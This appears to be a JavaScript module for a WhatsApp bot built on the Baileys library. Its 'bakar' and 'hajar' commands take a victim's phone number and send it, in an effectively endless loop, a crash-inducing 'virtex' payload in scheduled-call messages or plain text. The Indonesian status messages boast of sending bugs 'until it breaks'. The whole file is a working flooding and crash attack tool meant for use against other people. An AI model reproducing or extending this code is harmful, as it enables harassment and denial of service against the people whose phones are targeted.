const fs = require('fs')
const moment = require('moment-timezone')
const { buttonkal } = require('../virtex/buttonkal')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")


const proses = `▬▭▬▭▬▭▬▭▬▬▭▬▭▬
   ⚠  ATACK STARTED ⚠
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`


module.exports = async (wa, m, msg, store) => {
    to = m.chat
    text = m.body
    cmd = text.toLowerCase()


    if (cmd.startsWith("bakar")){
        sep = text.split(" ")
        target = sep[1]
        if (target.slice(0, 2)  == "08"){
            target = "62" + target.slice(1)
        }
        if (target.includes("-")){
            target = target.replaceAll("-", "")
        }
        // MAIN LOOP
        await wa.sendText(to, proses)
        Pe = target+'@s.whatsapp.net'
        jumlah = "9999999999999999999999999999"
        for (let i = 0; i < jumlah; i++) {
            var scheduledCallCreationMessage = generateWAMessageFromContent(to, proto.Message.fromObject({
                "scheduledCallCreationMessage": {
                    "callType": "2",
                    "scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
                    "title": buttonkal,
                }
            }), 
            { userJid: to, quoted : m})
            await wa.relayMessage(Pe, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
            console.log(`ATACKED SEND [ ${i} ] SUKSES TO [ ${target} ] `)
        }
        wa.sendText(to, `*Sukses mengirim ${jumlah} Bug Ke ${target} Kirim terus ampe jebol*`)
    }

    else if (cmd.startsWith("hajar")){
        sep = text.split(" ")
        target = sep[1]
        if (target.slice(0, 2)  == "08"){
            target = "62" + target.slice(1)
        }
        if (target.includes("-")){
            target = target.replaceAll("-", "")
        }
        // MAIN LOOP
        await wa.sendText(to, proses)
        Pe = target+'@s.whatsapp.net'
        jumlah = "9999999999999999999999999999"
        for (let i = 0; i < jumlah; i++) {
            await wa.sendMessage(Pe, {text: buttonkal});
            console.log(`ATACKED SEND [ ${i} ] SUKSES TO [ ${target} ] `)
            
        }
        wa.sendText(to, `*Sukses mengirim ${jumlah} Bug Ke ${target} Kirim terus ampe jebol*`)
    }
    
}
  